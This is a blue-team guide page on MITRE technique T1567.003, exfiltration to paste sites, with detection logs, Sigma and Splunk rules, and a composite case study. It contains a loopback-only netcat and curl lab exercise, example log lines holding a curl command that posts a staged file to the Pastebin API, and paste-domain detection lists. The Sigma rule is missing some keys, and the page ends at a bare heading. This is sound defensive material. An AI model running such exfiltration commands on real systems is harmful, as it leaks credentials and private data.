T1567.003Exfiltration to Text Storage Sites

Stolen text — passwords, keys, configurations, small databases — can leave a network in a single HTTPS (encrypted web) POST to a paste-style site such as Pastebin. POST is the web request that sends data; here it carries the stolen text itself. The attacker often needs no account at all: the short paste URL (web address) that comes back becomes the link to the stolen data. This guide walks the whole chain and shows defenders how to catch it with proxy categories, DNS (domain name system) queries, process command lines, and DLP (data-loss prevention).

Tactic: Exfiltration ID: T1567.003 Parent: T1567 Platforms: ESXi · Linux · Windows · macOS Type: Sub-technique Version: 1.1 Created: 27 February 2023 Last modified: 15 April 2025

What happens

Text is POSTed to a paste site; a short URL comes back and the attacker reads the raw paste from anywhere.

Chain position

Usually the final exfiltration stage — but also used mid-chain for staging and dead-drop handoffs.

Biggest risk

One small HTTPS POST can carry credentials. Volume-based exfil rules never see it; it looks like any web request.

Detect with

Proxy categories from server subnets, DNS queries, process command lines (curl/wget/nc), and DLP on request bodies.

Overview

What this sub-technique is, why a few hundred bytes of outbound HTTPS can hurt more than a terabyte of file transfers, and what this page teaches.

Exfiltration to Text Storage Sites (T1567.003) describes adversaries moving stolen data out of a network by posting it to public paste-style services. Targets include Pastebin, gist services, dpaste-style sites, and netcat-style text listeners such as termbin. The data is plain text or text-encoded (typically base64), the transport is ordinary HTTPS, and the operation is tiny: one POST request, usually well under a megabyte. The response is a short URL, and that URL is the stolen data's new home, reachable from anywhere in the world. ATT&CK lists the technique for ESXi, Linux, Windows, and macOS — ESXi being VMware virtualization hosts.

Why does such a small action matter so much? The most damaging payloads in real intrusions are small and textual. Think of a database configuration file with the database-administrator (DBA) password. Think of a .env file, a cloud API (application programming interface) key, a user table dumped as CSV (comma-separated values), or a private SSH (Secure Shell) key. Volume-based exfiltration monitoring watches for large uploads and passes this traffic without a second look. A paste POST from a server that should never browse beats any bytes-per-second threshold as a signal. This guide shows you how to build exactly that rule.

In the ATT&CK chain, this technique sits under its parent T1567 · Exfiltration Over Web Service in the Exfiltration (TA0010) tactic. It is most often the closing move after Collection (TA0009): something on an endpoint or server has already gathered the text, and the paste POST carries it out. The technique also appears mid-chain. Paste sites work as staging and dead-drop locations, which parallels T1102 · Dead Drop Resolver — same infrastructure, different intent. In a staging pattern the malware downloads tasking or configuration from a paste; in this sub-technique the malware or operator uploads stolen data.

    The written story — every step in text

    The canvas uses five nodes. Attacker is the external operator's infrastructure. Web server is the victim: an internet-facing blog server with an unpatched CMS (content-management system). Paste site is the public text-storage service receiving the stolen data. Internal host is a second system inside the network that later receives the leaked password. SOC (security operations center) is the defender's view, fed by proxy, DNS, EDR, and authentication logs.

    1. 1 · A tired old blog server. The server runs quietly on an unpatched CMS. No alerts are firing; dashboards are green. What the defender sees: a monthly vulnerability scan flagged the CMS version last month and the ticket is still open — the entry point was already known. Evidence: vulnerability scan report.
    2. 2 · Webshell established. The attacker probes the CMS upload endpoint. The WAF blocks twelve attempts, and one request evades a rule gap; a small webshell is now running on the server (shown conceptually — no exploit content). What the defender sees: the WAF log shows 13 probes from one IP, 12 blocked, 1 allowed — and nobody has reviewed the allowed line. Evidence: WAF log.
    3. 3 · Harvesting text. Using the webshell, the attacker runs a database dump: the DB config file and the user table, stitched into one text blob and base64-encoded so it survives any input filtering. What the defender sees: EDR records mysqldump spawned by the PHP worker user writing to a temp file — an odd parent process at an odd hour. Evidence: mysqldump process event.
    4. 4 · One small POST. The server itself makes a quiet HTTPS POST to a paste-site API. The request is under a kilobyte: a fake dev key placeholder and the base64 blob as a form field. What the defender sees: the proxy logs a POST to a paste category from a server subnet — servers never browse, so this single row justifies pulling the packet. Evidence: proxy POST row.
    5. 5 · The paste URL. The paste service answers with a short URL, https://pastebin.com/abcd1234 in this example. The attacker now holds a public link to the stolen text. What the defender sees: almost nothing — a 21-byte response archived in the egress log, easy to miss next to normal traffic. Evidence: paste URL in egress log.
    6. 6 · Attacker fetches raw. From his own infrastructure the attacker opens the raw paste to confirm the payload arrived intact. What the defender sees: the SOC cannot see paste-site visitor analytics; the fetch itself is invisible. The dump usually surfaces later through brand monitoring or an external tip. Evidence: brand-monitoring alert (external, later).
    7. 7 · Credentials burn. The dumped DB password is replayed against a second internal host — and it works. What the defender sees: the authentication log shows three failures followed by a success from a web-server service account on a host it has never touched. This is the first loud signal in the whole chain. Evidence: cross-host login anomaly.
    8. 8 · SOC connects. The analyst joins the pieces — mysqldump, the paste POST, the login anomaly — and declares an incident. Paste categories are blocked for server ranges and an egress policy per asset class is created. What the defender sees: the chain is cut at the egress point; future dumps from any server now fail closed. Evidence: egress policy.

    3

    Red Team / Hacker Perspective

    Why attackers pick paste sites, what they need in place first, and the variations you will meet in reporting. All commands here run against a receiver on your own machine only.

    For an operator, paste sites are attractive for practical reasons: speed (one command, no rented infrastructure), cost (free on most services), and access (many services need no account). The traffic is also cover: ordinary HTTPS to a popular domain that proxies rarely block. The data itself must be text, which is not much of a limit. Credentials, keys, configs, and database rows are text, and anything else can be base64-encoded until it is.

    There is also a staging use that red teams should understand even though it is a different technique: a paste URL is a free, stable, disposable command-and-config location. Malware families documented in public reporting have fetched tasking from paste-like services (the T1102 dead-drop pattern), and operators have pasted "configuration as text" that implants read on schedule. When you see paste downloads in a client environment, treat it as a separate detection problem from paste uploads.

    When and where attackers use it

    When: most often as the closing move of an intrusion, right after collection. The stolen material is text, and the operator wants it out in minutes. It also appears mid-chain as staging. In insider scenarios it can be a single human decision with no malware timeline at all.

    Where: anywhere the technique's platforms run — Windows and macOS workstations, Linux and Windows servers, and ESXi (VMware virtualization) hosts that can reach the internet. Typical vantage points are a webshell on an internet-facing server, a scheduled job on a build or database host, a browser on a workstation, and a compromised container pod.

    Prerequisites

    • Outbound HTTPS (or one raw TCP port). The victim must reach the paste domain, or any host that accepts arbitrary text — that includes netcat-style text listeners on ports like 9999.
    • Data expressible as text. Dumps must be serialized (CSV, JSON, SQL text, base64 blobs). Big binary files push operators toward other T1567 sub-techniques instead.
    • Execution on the victim. Something must run the HTTP client: a webshell, a task scheduler entry, an implant, or a human insider pasting from a workstation.

    ⚠ LAB-ONLY: Reproduce the request shape against a receiver on your own machine — never against a real paste service. In one terminal, start a local receiver on your own machine.

    Terminal A — local receiver (your own box).
    # Traditional netcat syntax (GNU netcat / ncat):
nc -l -p 9999
# BSD-style netcat (macOS):
nc -l 9999

    In a second terminal, send the POST to your own loopback address.

    Terminal B — curl to 127.0.0.1 only.
    curl -s -X POST --data "text=lab-only-demo-value" http://127.0.0.1:9999/receive

    Terminal A now shows the raw request — the same shape a proxy would summarize: a POST line, headers, and a short form-encoded body. On Windows, the equivalent local-only test uses PowerShell.

    PowerShell — local receiver only.
    Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:9999/receive" -Body "text=lab-only-demo-value"

    The paste-API variant seen in real incidents has the same skeleton: a POST with a key field, plus a content field. But do not send it anywhere public. Logging the loopback request in terminal A is the whole exercise.

    Common variations

    API-key pastes

    Services with an API accept a developer key plus the paste body as form fields. For attackers this buys unlisted pastes and higher size limits; for defenders it means the request carries a key-shaped form field — a DLP pattern worth matching.

    Gist drips

    Code-hosting gists blend in with developer traffic. A single-line "snippet" that is actually a base64 chunk rides along with normal engineering egress, which is why category-only blocking of "paste sites" misses it.

    Chunked base64 across many pastes

    A large dump is split into numbered chunks, one paste each, reassembled off-network. Each request is small and individually harmless-looking; the tell is repetition from one host inside a short window.

    Paste-as-config (ingress)

    The inverse flow: a paste holds tasking or configuration that an implant reads on schedule. That is T1102 territory — detect it with egress GET patterns and paste-content monitoring, not with the POST-focused rules in section 5.

    ℹ Note: netcat-style text listeners (the termbin model, port 9999) accept anything piped to them and return a URL. They matter to defenders mostly as a netflow signature: raw TCP to port 9999 from a server is strange regardless of destination. The shape-only test above runs against 127.0.0.1, so it never touches the public service.

    Mistakes operators make (and you should detect)

    • One huge dump. Paste services enforce size limits; an oversized POST fails loudly or gets truncated mid-exfil. Chunking fixes the operator's problem but creates the repetition pattern that rule 5.5-5 catches.
    • Reusing the same paste account. Accounts persist across incidents; two dumps from one account tie otherwise unrelated cases together.
    • Predictable paste keys or titles. Names that include the company or product let brand monitoring — and researchers — find the dump later. That is exactly how the case study in section 6 gets discovered.
    • Forgetting that TLS inspection may exist. Where lawful TLS inspection is deployed, the "encrypted" body is readable, and DLP patterns match instantly.

    ✗ Danger: Testing with a real paste account — even "just harmless text" — creates a public artifact tied to your name or your client. It may breach acceptable-use policy, and it trains you on infrastructure you do not control. Everything you need to validate these detections lives in a local receiver, a private proxy, and generated sample logs.

    4

    Blue Team / SOC Perspective

    The artifacts a paste-dump leaves, where to look first, and a triage flow that turns one odd proxy row into a scoped incident.

    Defenders rarely see the paste POST as an alert on day one. What they see is an unexplained egress row. It could be a server that talks to a paste category. It could be a curl process that has no business on that host. Or it is a DNS query for a paste domain from a VLAN (virtual local area network) that never resolves one. Each individual artifact is small, and that is what makes the technique quiet. Detection therefore depends on context rules — who is allowed to talk to paste sites? — rather than on volume or reputation alone.

    Where to look, in order

    1. Proxy egress by asset class. Filter paste and file-drop categories by source subnet. Any hit from a server range goes to the top of the queue; the same hit from a workstation is lower priority but still reviewed.
    2. The process that made the request. Join the proxy row's timestamp to EDR process telemetry on that host: which binary, which parent, which user. curl parented by a web application worker is a very different case from curl run by an admin.
    3. What text actually left. If TLS inspection is lawful and deployed, read the body; if not, reconstruct from the source: the EDR file-write that preceded the POST, the webshell's commands, the database dump in a temp directory. Size and shape of the request body narrow what class of data left.
    4. Rotate first, investigate second. Any indication that credentials left the network triggers rotation of those credentials — and everything sharing them — before the analysis is "finished". Attackers read pastes faster than analysts write tickets.
    5. Scope outward. Same source host in prior weeks, same destination from other hosts, the dumped account across the estate, and paste domains in DNS logs from every subnet. Then check the web/WAF trail for the entry point.

    ⚠ Warning: Once a paste URL exists, the data is effectively public. "Unlisted" is not "private" — anyone with the URL reads the raw text. The response to a confirmed paste dump is a credential-rotation event with a defined completion time, not a help-desk task with a relaxed service-level agreement (SLA).

    Why this fits the chain

    Exfiltration is the last tactic before Impact. The paste-dump pattern also explains mid-chain mysteries. A server that "phones home" with no C2 (command-and-control) domain in threat intel may be staging through a paste (T1102). A workstation posting small text blobs may be an insider's first rehearsal. Treat every confirmed instance as both an incident and a sensor calibration opportunity. The rules in section 5 exist to fire on the next one before the credentials burn.

    5.2 Threat intelligence

    Paste-site tradecraft moves slowly, but the actors using it rotate constantly. A small, disciplined intel workflow keeps the domain lists and category assignments in your rules current. The pipeline is always the same three moves:

    1 · Collect

    Pull technique updates from the MITRE ATT&CK site via STIX/TAXII (standardized threat-intelligence formats and their transfer protocol). Add vendor research from Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky, and Red Canary. Add OSINT (open-source intelligence) trackers such as abuse.ch, Any.run, malware-traffic-analysis.net, and vx-underground, plus commercial feeds like Recorded Future and VirusTotal where budget allows.

    2 · Analyze

    Separate pattern claims (paste sites used for staging or dumps) from attribution claims (a named group did X). Tag each item High/Medium/Low confidence, keep the domain and category lists versioned, and record why each entry earned its place.

    3 · Apply

    Update the paste-domain lists in the 5.5 rules, the proxy category mappings, and your brand-monitoring keywords. Feed confirmed incidents back into internal telemetry: past incidents, honeypot hits, and EDR history are your highest-value feed.

    Sources worth a standing subscription of attention

    • MITRE ATT&CK site + STIX/TAXII — the technique's official definition, examples, and machine-readable updates when the sub-technique changes.
    • Vendor blogs (Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky, Red Canary) — the fastest public source for "we saw a family stage or dump via paste services" pattern reporting.
    • OSINT: abuse.ch, Any.run, malware-traffic-analysis.net, vx-underground — sandbox traces and PCAPs frequently show the exact POST shapes described in 5.4.
    • Commercial feeds (Recorded Future, VirusTotal) — enrichment: paste URLs appearing in reports, fresh paste domains, infrastructure pivots.
    • ISACs (information sharing and analysis centers — MS-ISAC, FS-ISAC, H-ISAC, E-ISAC, ICS-ISAC) — sector-specific warnings; if a peer got dumped to a paste site, your keywords should update that week.
    • Internal telemetry — your own past incidents, honeypots, and EDR history. Nothing tunes false positives like knowing what your environment really does.

    5.3 Threats ranking and categorization

    Six scenarios cover the realistic space of this technique, ordered by expected harm. ATT&CK lists the platforms as ESXi, Linux, Windows, and macOS; ESXi means VMware virtualization hosts. The category badges map those platforms to Windows, macOS, Linux, and Cloud labels — ESXi and container workloads sit under Cloud with a Linux base. Each row links to its log sources in 5.4 and its rules in 5.5. Severity reflects typical impact if the scenario succeeds undetected, not likelihood alone.

    #ThreatSeverityCategoryScenario & preconditionsImpact & rating justification
    1 Credential/config dump posted to a paste site High Windows macOS Linux ESXi A compromised server, workstation, or ESXi host — via webshell, implant, or manual operator action — collects credentials or configuration as text and posts them in one request. Preconditions: outbound HTTPS; execution on the victim; data reducible to text. Credentials are burned worldwide within minutes; every system sharing them is exposed. Justification: tiny, quiet, single request — volume rules miss it, and the damage extends to every reused credential.
    2 Scripted drip exfiltration from a compromised server Medium Linux Windows An implant plus a scheduler (cron, scheduled tasks) posts small chunks on a slow rhythm — one row per hour, one paste per row. Preconditions: persistent execution; scheduler access; egress allowed to paste domains. Low-and-slow beats volume rules and size alerts entirely. Justification: slower burn, but sustained access means the attacker selects exactly what to drip; chunked pastes evade size-based alerts by design.
    3 Insider pastes source code or secrets from a workstation High Windows macOS A user with legitimate access posts proprietary snippets, .env files, or keys to a paste service — maliciously or carelessly — often from a browser. Preconditions: user access to the data; uncontrolled paste egress; no DLP on request bodies. IP and secret loss with no malware artifact at all. Justification: looks exactly like a developer sharing a snippet, so it survives both technical and human review unless DLP and context (time, asset, policy) are applied.
    4 Paste site as dead-drop handoff between parties Medium Network Two parties exchange data through a paste URL both already know — brokered sale, insider-to-external handoff, staged delivery. Preconditions: both sides know the URL; at least one side posts from inside the network. Brokered data exchange with minimal infrastructure for either side. Justification: hard to attribute and easy to deny; detection leans on egress-to-paste followed by inbound references and netflow patterns rather than content rules.
    5 Chunked/base64 bulk exfiltration across many pastes Medium Windows macOS Linux A dump too large for one paste is split into numbered, base64-encoded chunks posted in sequence within a short window. Preconditions: egress allowed; attacker accepts the visibility cost of repetition. Reassembly happens off-network; no single request is remarkable. Justification: the repetition itself is the detection win — N small POSTs from one host inside minutes is a strong, low-noise signal.
    6 Exfiltration from containerized workloads to paste APIs Medium Cloud Linux A compromised pod or container — in a cluster whose egress defaults to allow-all — POSTs secrets (service tokens, env dumps) to a paste API. Preconditions: pod-level egress unrestricted; secrets present in the workload's environment. "Allow all" egress in Kubernetes turns every pod into an exit channel. Justification: noisy clusters rarely baseline pod egress, so a single small POST vanishes; the exposure is the pod's secret material, which is often cluster-wide.

    ℹ Note: Scenarios 1 and 3 earn High severity for opposite reasons — 1 is quiet automation with stolen credentials, 3 is a human with legitimate access. Your controls must catch both: egress policy and DLP for 1, body-pattern DLP plus context tuning for 3. Scenario 4 usually only becomes visible in hindsight, which is why netflow retention matters.

    5.4 Logs and patterns

    For each threat in 5.3 this subsection lists the log sources and key fields. It contrasts normal and suspicious behavior, states the detection logic in one sentence, and gives a realistic event example with its fields explained. Timestamps use 2025 dates; addresses use RFC 5737/1918 documentation ranges.

    Threat 1 — Credential/config dump posted to a paste site

    Log sources & key fields: proxy/SWG access logs (method, r-dns, category, clientIp, cs-bytes, user-agent, uri) and, where TLS inspection is lawful, DLP body matches. Also EDR process lines (Image, CommandLine, User, ParentImage) and DNS resolver logs (query, client).

    Normal behavior

    Paste-category traffic exists — from workstation subnets, during human hours, with browser user agents, usually to a handful of approved domains. DNS for paste domains resolves from user VLANs only.

    Suspicious behavior

    A POST to a paste domain from a server subnet, with a non-browser user agent, at any hour. Bonus red flags: request body contains key/value form fields or base64-like text (TLS-inspected environments), or a config-writing process ran seconds earlier.

    Detection logic: alert when any POST to a known paste/text-storage domain originates from an address in a server or infrastructure subnet — regardless of size or status code.

    example — proxy access log (squid-style key=value row)
    1744704431.412    512 10.20.4.15 POST https://pastebin.com/api/api_post.php - DIRECT/198.51.100.21 application/x-www-form-urlencoded POST 812 200 21 "curl/8.5.0" - TAG:paste-sites SRC-TAG:webserver_vlan -
    • 1744704431.412 — unix epoch timestamp of the transaction.
    • 512 — milliseconds the request took; irrelevant here except to show it was a fast, small exchange.
    • 10.20.4.15 — requesting client: a server address, not a workstation. This field + the subnet tag carries the whole detection.
    • POST https://pastebin.com/api/api_post.php — method + URI: the paste API endpoint shape.
    • application/x-www-form-urlencoded — a form body: how paste APIs carry the key and content fields.
    • 812 / 21 — bytes sent / received. Small upload, tiny response (the paste URL) — the signature of a one-shot dump.
    • "curl/8.5.0" — a command-line client on a server: no human is browsing from this host.
    • TAG:paste-sites SRC-TAG:webserver_vlan — proxy category and source-asset-class tags used by the 5.5 rules.

    A supporting DNS row from the same second makes the pairing conclusive:

    example — DNS resolver log line
    15-Apr-2025 02:47:11.312 queries: info: client 10.20.4.15#49213: query: pastebin.com IN A +E(0)K (198.51.100.53)
    • client 10.20.4.15 — the same server IP as the proxy row; DNS precedes egress.
    • query: pastebin.com IN A — paste-domain resolution from a VLAN that should never resolve one.

    Threat 2 — Scripted drip exfiltration from a compromised server

    Log sources & key fields: EDR/Sysmon process events (EventID, Image, CommandLine, ParentImage, User) and scheduler or cron logs. Also proxy rows over time (clientIp, cs-bytes, uri distribution).

    Normal behavior

    Scheduled jobs on servers post to known endpoints (backup APIs, monitoring SaaS) with stable sizes and destinations. Cron runs curl for health checks to internal receivers at fixed minutes.

    Suspicious behavior

    Repeated small POSTs to paste domains from one host spread across hours; a scheduler parent spawning curl/wget with a file-argument; byte sizes that vary per row (chunks differ); destinations that rotate.

    Detection logic: alert on an hourly count of paste-category POSTs per source host above a low threshold (say 8), and separately on any scheduler-spawned curl/wget process line containing a file input.

    example — Sysmon (Linux) EventID 1 JSON, cron-spawned curl
    {
  "EventTime": "2025-04-15 02:47:13.088",
  "EventID": 1,
  "Computer": "web-prod-02",
  "User": "www-data",
  "Image": "/usr/bin/curl",
  "CommandLine": "curl -s --data @/tmp/.cache.txt https://pastebin.com/api/api_post.php",
  "ParentImage": "/usr/sbin/cron",
  "Hashes": "SHA256=9f2d31c0a8b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f7a8b9c0d1e"
}
    • User: www-data — the web application service user, not an admin: the process chain came through the web tier.
    • CommandLine — --data @file means the body was staged in a file first: the classic dump-and-post shape.
    • ParentImage: /usr/sbin/cron — persistence: this is scheduled, not a one-off operator action. Drip exfil lives here.
    • Image: /usr/bin/curl — the HTTP client that pairs with the proxy rows in the same minute.

    Threat 3 — Insider pastes source code or secrets from a workstation

    Log sources & key fields: DLP incidents (policy, match, channel, user, asset) and proxy rows (user-agent = browser, category, cs-bytes). Also HR/identity context (department, notice status) and auth/session times.

    Normal behavior

    Developers share snippets publicly, from workstations, during working hours, usually to domains the team uses (gists, code-paste tools on the allow list). Body sizes vary widely.

    Suspicious behavior

    Paste-category POST from a workstation outside working hours, or from a non-engineering asset; DLP match inside the body (key-shaped strings, private-key headers, secret-value patterns); a burst of paste POSTs in the days before a resignation date.

    Detection logic: join DLP body-pattern matches on paste-category egress to asset and identity context, and rank up when the time or the asset class makes "developer sharing a snippet" implausible.

    example — DLP incident JSON (TLS-inspected body match)
    {
  "incident_id": "DLP-2025-04481",
  "detected_at": "2025-04-15T02:47:41Z",
  "policy": "Secrets-in-outbound-bodies",
  "match": "credential-assignment pattern (password=... near host=...)",
  "channel": "HTTPS request body (paste domain, category paste-sites)",
  "user": "j.reyes@corp.example",
  "asset": "LAP-4431 (asset_class=workstation, dept=engineering)",
  "destination": "https://pastebin.com/api/api_post.php",
  "bytes_uploaded": 1044,
  "action": "blocked, evidence retained"
}
    • policy / match — the pattern that fired: credential-shaped assignments, not just a category hit. This names the data.
    • channel — the leak was an HTTPS body, which is why body-level DLP (not email-only DLP) is the control that works.
    • detected_at 02:47Z — outside working hours for this region: the context boost that raises severity.
    • asset ... dept=engineering — identity context turns the row into an HR-aware case, handled with policy, not just blocking.

    Threat 4 — Paste site as dead-drop handoff between parties

    Log sources & key fields: netflow/firewall records (src_ip, dest_ip, dest_port, bytes) and proxy rows for the posting side. Also DNS for paste domains from unusual subnets and, later, inbound references (email/brand-monitor) that cite a paste URL.

    Normal behavior

    Netflow to content networks shows TLS sessions to CDNs (content delivery networks) with sustained byte counts. Nothing "small and lonely" to raw TCP ports on arbitrary hosts.

    Suspicious behavior

    A short raw-TCP flow to port 9999-style text listeners; a one-shot TLS flow to a paste IP that never recurs; the same host later seen in an inbound reference (an external party citing the URL).

    Detection logic: alert on netflow from any host to raw-text-listener ports (9999 is the canonical one) and on one-shot egress to paste domains followed — days later — by an inbound mention of that URL, which converts the flow from oddity to handoff.

    example — netflow record (CSV): raw text-listener flow
    2025-04-15T03:12:44Z,10.44.2.9,198.51.100.7,49213,9999,tcp,PSH+ACK,340,120,9
    • 10.44.2.9 → 198.51.100.7:9999/tcp — a server talking raw TCP (transmission control protocol) to a non-standard port: no proxy row will exist for this, which is why netflow carries the detection.
    • 340 bytes out / 120 back — a small push and a tiny response: exactly the "post text, get a URL" exchange of a netcat-style text listener.
    • PSH+ACK, 9 packets — a single short burst, not a session: consistent with one command's output being piped out.

    Threat 5 — Chunked/base64 bulk exfiltration across many pastes

    Log sources & key fields: proxy rows aggregated per host (clientIp, method, cs-bytes, uri cardinality) and optional TLS-inspected body entropy hints. The hints stay conceptual — track base64-likeness, not raw bytes, to stay privacy-safe.

    Normal behavior

    Workstations POST to paste domains a handful of times a day, with wide size variation and browser user agents. No host posts dozens of times within minutes.

    Suspicious behavior

    15+ small POSTs (each under ~2 KB) from one host within a 10-minute window; URI paths that differ only by a chunk number; bodies (where visible) dominated by base64 character classes.

    Detection logic: count paste-category POSTs per source host per short window and alert when both the count and the small-size pattern hold together — one or the other alone is noise.

    example — four proxy rows from one host inside four minutes
    02:51:02 10.20.4.15 POST pastebin.com/api/api_post.php cs-bytes=617 sc=200 "curl/8.5.0" TAG:paste-sites
02:53:47 10.20.4.15 POST pastebin.com/api/api_post.php cs-bytes=598 sc=200 "curl/8.5.0" TAG:paste-sites
02:54:31 10.20.4.15 POST pastebin.com/api/api_post.php cs-bytes=641 sc=200 "curl/8.5.0" TAG:paste-sites
02:55:19 10.20.4.15 POST pastebin.com/api/api_post.php cs-bytes=604 sc=200 "curl/8.5.0" TAG:paste-sites
    • cs-bytes ~600 on every row — each request is a fresh small chunk: individually unremarkable, collectively a dump.
    • same client, same endpoint, minutes apart — the repetition is the pattern; the 5.5 rule counts it per host per window.
    • "curl/8.5.0" — a non-browser client rules out a human pasting by hand, which collapses most false-positive space.

    Threat 6 — Exfiltration from containerized workloads to paste APIs

    Log sources & key fields: pod-level egress logs — Cilium/Hubble or Calico flows (namespace, pod, verdict, dns_query, dest) — plus Kubernetes audit logs (NetworkPolicy changes) and cloud egress logs.

    Normal behavior

    Pods in a well-run cluster egress only to their namespace's allow list: service meshes, registries, known APIs. verdict: FORWARDED rows resolve to in-policy destinations.

    Suspicious behavior

    FORWARDED egress from a pod whose DNS query is a paste domain — possible only when no namespace egress policy matched (allow-all default); a NetworkPolicy change shortly before the flow.

    Detection logic: alert when a forwarded pod egress flow's DNS query matches paste domains — the flow should never have been forwarded, and its existence proves the namespace allow-list is missing.

    example — Cilium/Hubble flow JSON (simplified)
    {
  "time": "2025-04-15T02:47:12.612Z",
  "verdict": "FORWARDED",
  "direction": "EGRESS",
  "IP": { "source": "10.244.7.31", "destination": "198.51.100.21" },
  "l4": { "TCP": { "source_port": 44812, "destination_port": 443 } },
  "source": { "namespace": "prod-api", "pod_name": "orders-7f9c4d-z2qvx" },
  "dns_query": "pastebin.com",
  "traffic_direction": "EGRESS",
  "policy_match_type": "none"
}
    • namespace: prod-api / pod: orders-… — a production workload, not a dev sandbox: the exposure is the pod's secret material (env vars, service tokens).
    • dns_query: pastebin.com — the paste domain resolves from inside the cluster; DNS gives you the name the IP alone would hide.
    • verdict: FORWARDED + policy_match_type: none — no egress policy applied: the "allow all" default the mitigation section fixes with default-deny NetworkPolicies.

    5.5 Sigma rules and Splunk SPL

    One Sigma rule and one Splunk SPL query per threat in 5.3. The Sigma rules are valid YAML with all required keys, and they convert with sigmac to your backend. Field names (cs-method, r-dns, clientIp) follow common proxy conventions — check your own field extraction before deploying. Hyphenated proxy fields are usually normalized to underscores at ingest: r-dns becomes r_dns, cs-bytes becomes cs_bytes, and cs-User-Agent becomes user_agent. SPL queries assume the example indexes shown; adapt index, sourcetype, and field names to your environment, and document those assumptions in the rule ticket.

    Rule 5.5-1 · Egress POST to text storage sites from server subnets High

    sigma — proxy / category + asset-class logic
    title: Egress POST to Text Storage Sites from Server Subnets
id: 7d4c9a31-8f2b-4e6a-9c15-3ab8e21d7f04
status: stable
description: Detects HTTP POST requests to well-known paste and text storage domains from addresses classified as servers or infrastructure. A server that posts to a paste site is a strong T1567.003 exfiltration signal regardless of request size.
references:
  - https://attack.mitre.org/techniques/T1567/003/
author: Blue Team Guide - T1567.003 page
date: 2025-04-15
logsource:
  category: proxy
detection:
  sel_method:
    cs-method: 'POST'
  sel_hosts:
    r-dns|endswith:
      - '.pastebin.com'
      - '.paste.ee'
      - '.dpaste.org'
      - '.hastebin.com'
      - '.termbin.com'
      - '.gist.github.com'
  filter_workstations:
    src_asset_class: 'workstation'
  condition: sel_method and sel_hosts and not filter_workstations
fields:
  - clientIp
  - r-dns
  - c-uri
  - cs-method
  - cs-bytes
  - cs-User-Agent

  - Documented administrator scripts covered by a change ticket

  - attack.exfiltration
  - attack.t1567.003

    Mapping note: category:proxy maps to your proxy index. The SPL below mirrors the Sigma exactly — each r-dns|endswith value becomes a *.domain wildcard. src_asset_class assumes a lookup or tag that classifies subnets/hosts; the SPL shows the lookup variant, and if you lack it, filter on server CIDR ranges with cidrmatch() instead.

    splunk spl — same logic
    -- Adapt index/sourcetype/field names to your environment. Assumes an asset lookup classifying hosts.
index=proxy sourcetype=squid:access method="POST"
  (r_dns="*.pastebin.com" OR r_dns="*.paste.ee" OR r_dns="*.dpaste.org" OR r_dns="*.hastebin.com" OR r_dns="*.termbin.com" OR r_dns="*.gist.github.com")
| lookup asset_lookup ip AS clientIp OUTPUT asset_class, owner, zone
| search NOT asset_class="workstation"
| stats count AS posts, max(cs_bytes) AS max_bytes, values(uri) AS sample_uris, values(user_agent) AS agents BY clientIp, r_dns, asset_class, owner
| sort - posts
    • False positives: sanctioned automation that posts status text to an approved paste endpoint; a developer VM mis-tagged as a server.
    • Tuning: keep an allow-list of (server, destination) pairs covered by change tickets; alert on everything else. Split the rule per data center if one proxy serves mixed zones. Review the domain list quarterly against 5.2 sources.

    Real-World Case Study: Project Greyboard

    A hosting provider loses database credentials to a paste site, and the loudest alarm rings outside the network. Composite scenario — see the honesty note below.

    ℹ Note: "Project Greyboard" is an illustrative composite based on public reporting patterns, not a single documented incident. The chain — unpatched CMS, webshell, database dump, one small paste POST, external discovery — matches patterns that defenders and researchers have described publicly for years. Dates, hostnames, and people are invented; the detection gaps are the lesson.

    The context

    Greyboard is a mid-sized hosting provider running a customer portal, a billing database, and a small fleet of marketing sites for clients. One of those marketing sites runs an aging content-management system on the same flat internal network as the billing infrastructure — a common and dangerous design. The company has a capable SOC on paper: a SIEM, an EDR fleet, a web proxy with category logging, and a monthly vulnerability scan. What it lacks is an egress policy per asset class, DLP on outbound HTTPS bodies, and any rule that joins "server talks to paste site" to "something bad is happening". Brand monitoring exists — as a marketing function watching for trademark misuse, disconnected from the SOC entirely.

    The timeline

    • Day 0 · Tue 8 Apr 2025Webshell lands. An attacker exploits an unpatched CMS plugin on the marketing site and plants a small webshell. The WAF blocks twelve probing requests but lets one through a rule gap. Nobody reviews the allowed line that week.
    • Day 2 · Thu 10 Apr, 02:47Harvest and dump. Using the webshell, the attacker runs mysqldump as the web application's service user and grabs the billing DB configuration and user table. The text is base64-encoded and POSTed to a paste-site API with a single curl command. The response: a short paste URL.
    • Day 2–9Silence inside. The proxy row (paste category, server subnet, 812 bytes) sits unqueried. The DNS query from a server VLAN is logged but no rule watches it. No volume threshold was crossed, so no exfiltration alert fired. The credentials are public for a week.
    • Day 9 · Thu 17 Apr, 10:20External discovery. A security researcher emails the provider: a paste titled with the company name contains what looks like a database password. The SOC's first internal artifact of the entire incident is an email from outside.
    • Day 9 · 10:20–14:00Containment. Incident bridge opens. Every DB and service credential reachable from the marketing network is rotated — including the exposed billing DB account — and paste categories are blocked at the proxy for all server ranges, effective immediately.
    • Day 9–10Eradication. The webshell is located and removed; a full web-root and cron sweep finds one more dormant implant scheduled by the attacker as backup access. The CMS and plugins are patched; the marketing site's PHP sessions and application sessions are invalidated. The marketing network is segmented away from billing.
    • Day 10–14Recovery check. The team audits billing DB access logs between the dump (Day 2) and the rotation (Day 9): no unauthorized queries beyond the initial read the attacker performed. The account had read access to billing tables but not write access — luck, not control.
    • Day 14+Hardening. Egress policy per asset class goes live, brand/keyword monitoring moves into the SOC's toolchain, DLP secret-pattern rules are extended to HTTPS bodies where inspection is lawful, and a patch SLA for internet-facing applications is agreed with IT.

    Detection point: the paste itself — found by an outsider

    The detection point of this incident is uncomfortable reading: the paste was found externally, nine days after the dump, by a researcher who searched for the company name. Every internal sensor had the evidence — the proxy row, the DNS query, the EDR process event — but no rule joined them to a server-asset-class context. The incident therefore validates the three controls this page keeps repeating. An egress policy that forbids paste categories from server subnets comes first — rule 5.5-1 would have fired within seconds. Process-line detections for curl spawned by service users come second (5.5-2). Brand and keyword monitoring, treated as a SOC sensor rather than a marketing tool, comes third. Any one of the three would have compressed a nine-day exposure into minutes.

    Containment, eradication, recovery

